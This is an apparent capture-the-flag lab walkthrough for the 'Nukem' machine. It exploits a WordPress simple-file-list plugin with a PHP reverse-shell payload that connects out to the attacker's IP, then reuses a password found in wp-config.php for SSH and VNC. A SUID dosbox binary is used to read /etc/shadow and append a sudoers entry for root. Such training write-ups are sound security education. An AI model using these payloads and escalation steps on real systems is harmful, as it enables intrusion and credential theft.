# Exploitation Guide for Nukem

## Summary

In this walkthrough, we'll gain RCE via a vulnerable plugin in the WordPress installation. After careful enumeration, we discover a SUID binary that requires GUI access. With more enumeration we discover a VNC service, reuse a discovered password, and leverage the SUID binary to gain root access.

## Enumeration

### Nmap

We'll start off with an `nmap` scan.

```
kali@kali:~$ sudo nmap -sV -sC 192.168.120.55

### WPScan

There are several interesting services, but we'll begin by exploring the WordPress installation on port 80 with `wpscan`.

```

We discover an RCE exploit for the [_simple-file-list_ plugin](https://www.exploit-db.com/exploits/48979).

## Exploitation

### WordPress Plugin Remote Code Execution

Let's copy the exploit to our working directory, replacing the line 36 of the exploit with our attacking machine's IP address and the appropriate port number:

```
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.118.8/80 0>&1"); ?>'
```

Before running the exploit, we'll set up a Netcat listener.

```
kali@kali:~$ sudo nc -lvnp 80
listening on [any] 80 ...
```

With the listener running, we'll execute the exploit.

```
kali@kali:~$ python3 48979.py http://192.168.120.55
[ ] File 9357.png generated with password: b3824ae2f451a1801fab81d9ff080139
[ ] File uploaded at http://192.168.120.55/wp-content/uploads/simple-file-list/9357.png
[ ] File moved to http://192.168.120.55/wp-content/uploads/simple-file-list/9357.php
[+] Exploit seem to work.
[*] Confirmning ...
```

Our Netcat listener should have caught the reverse shell.

```
kali@kali:~$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.55] 54012
bash: cannot set terminal process group (352): Inappropriate ioctl for device
bash: no job control in this shell
[http@nukem simple-file-list]$
```

### Password Reuse

As we begin to enumerate, we identify a _commander_ user in the home directory. After careful enumeration, we discover the password for the MySQL server:

```
[http@nukem http]$ cat wp-config.php
cat wp-config.php
...
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
...
```

Let's test these credentials.

```
$ ssh commander@192.168.120.55
The authenticity of host '192.168.120.55 (192.168.120.55)' can't be established.
ECDSA key fingerprint is SHA256:12pFiOx1TBYX+6LlFEj3HR0305rPpXDWLKkdg1JLYSM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.120.55' (ECDSA) to the list of known hosts.
commander@192.168.120.55's password: CommanderKeenVorticons1990
[commander@nukem ~]$ 
```

Success! We have access as _commander_.

## Escalation

### Dosbox SUID

While enumerating, we discover several SUID binaries.

```
[commander@nukem ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/su
/usr/bin/ksu
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chage
/usr/bin/dosbox **
/usr/bin/newgrp
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd
```

The Dosbox binary has the SUID bit set, but it won't start in the console. We'll instead need to gain access to the graphical interface. Fortunately, a VNC session is running on this server on port 5901.

```
[commander@nukem ~]$ ps -ef | grep vnc
root         367       1  0 01:48 ?        00:00:00 /usr/bin/vncsession commander :1

command+     405     400  0 01:48 ?        00:00:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
command+     845     829  0 02:40 pts/0    00:00:00 grep vnc
```

Let's use port redirection to try to reach this service.

```
kali@kali:~$ ssh -L 5901:localhost:5901 commander@192.168.120.55
commander@192.168.120.55's password:
Last login: Wed Sep 30 02:36:30 2020 from 192.168.118.8
[commander@nukem ~]$
```

Now, let's use `vncviewer` to connect.

```
kali@kali:~$ vncviewer localhost:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: CommanderKeenVorticons1990

```

We are greeted with an XFCE desktop.

# Updating Sudoers File

LEt s open a terminal in the remote session and run `dosbox`. This results in classic DOS prompt.

![dosbox](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_38_image_1_smk2EeWJ.png)

dosbox

Following the [Dosbox WIKI](https://www.dosbox.com/wiki/MOUNT), we discover that the application should let us mount the file system. Let's try to mount the /etc directory and access the `shadow` file:

```
Z:\> mount C /etc
Drive C is mounted as local directory /etc/

Z:\> C:

C:\> type shadow
root:$6$MfW0zuduZhJE.svF$uDYH.../K0:18523::::::
bin:!*:18523::::::
daemon:!*:18523:::::
...
```

This confirms that we can read high-privileged files with DOS. We also discover that SUDO is present on the system. Let's add the _commander_ user to sudo and give our account full privileges.

```
C:\> dir sudoers
Directory of C:\
SUDOERS    3,176   30-09-2020  14:00

C:\> echo commander ALL=(ALL) ALL >> sudoers
```

Now, in our SSH session, we can use sudo to escalate to root.

```
[commander@nukem ~]$ sudo -i
[sudo] password for commander:

[root@nukem ~]# whoami
root
```
